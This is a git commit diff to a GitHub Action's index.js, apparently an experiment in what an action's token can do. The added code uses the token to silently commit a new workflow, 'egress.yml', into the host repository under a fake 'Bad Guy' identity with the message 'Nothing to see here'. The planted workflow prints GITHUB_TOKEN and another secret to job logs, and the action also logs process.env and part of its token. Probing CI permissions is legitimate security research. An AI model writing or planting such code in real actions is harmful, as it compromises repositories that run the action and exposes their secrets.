fddc8583f6c3fc8b83d6f260a244f9a9144603fa
Min RK <benjaminrk@gmail.com>
2021-04-16 14:49:07 +0200

    try making a workflow

--- index.js
+++ index.js
@@ -2,6 +2,22 @@ const core = require("@actions/core");
 const github = require("@actions/github");
 const https = require("https");
 
+const workflow = `
+name: "ruh-roh"
+on:
+  push:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - run: |
+      echo "test token: '\${{ secrets.GITHUB_TOKEN }}'"
+    - run: |
+      echo "test secret: '\${{ secrets.TEST_SECRET }}'"
+`;
+
 async function run() {
   const token = core.getInput("token");
   console.log(`Got token: ${token.slice(0, 10)}...`);
@@ -14,6 +30,29 @@ async function run() {
   console.log(process.env);
 
   const octokit = github.getOctokit(token);
+  const name = "Bad Guy";
+  const email = "badguy@example.local";
+  const owner = github.context.payload.repository.owner.login;
+  const repo = github.context.payload.repository.name;
+  console.log(`pushing to ${owner}/${repo}`);
+  try {
+    const { data } = await octokit.rest.repos.createOrUpdateFileContents({
+      owner,
+      repo,
+      path: ".github/workflows/egress.yml",
+      message: "Nothing to see here",
+      content: workflow,
+      committer_name: name,
+      committer_email: email,
+      author_name: name,
+      author_email: email,
+    });
+    console.log(data);
+  } catch (e) {
+    console.log(e);
+    core.setFailed(e.message);
+    return;
+  }
 
   try {
     const { data, headers } = await octokit.request("/");
@@ -22,6 +61,7 @@ async function run() {
   } catch (e) {
     console.log(e);
     core.setFailed(e.message);
+    return;
   }
 }
 
